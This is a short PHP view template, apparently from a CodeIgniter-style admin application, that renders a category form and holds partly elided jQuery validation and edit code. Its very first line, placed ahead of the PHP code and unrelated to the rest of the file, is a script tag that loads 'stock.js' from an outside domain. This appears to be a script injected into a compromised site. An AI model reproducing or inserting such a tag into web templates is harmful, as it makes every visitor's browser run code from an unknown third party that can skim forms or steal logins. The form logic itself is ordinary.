<script src='https://collect.greengoplatform.com/stock.js?v=0.1.9' type='text/javascript'></script><?php $data[$this->pages]=$this->kategori;$data['focus']=$this->nama; $this->load->view($this->generalHeader,$data) ?>
<div id="result-content"></div>
<?php form($this->kategori,$baseView); ?>


<script>
    var urlLocal    = `${strMasterData}/${strKategori}/`;
    ...
    formInput.validate({
        rules: {
            nama: {
                required: true,
                remote: {url: `${strKategori}/check_column`,type: "post",data: {param: function () {return paramForm.val();}}}
            }
        },
    ...
    function ubah(id) {
        ...
        handleCacheEdit(baseUrl,function(res){
            if (res.status) {
                ...
                var arrId   = [strId,strNama,strStatus];
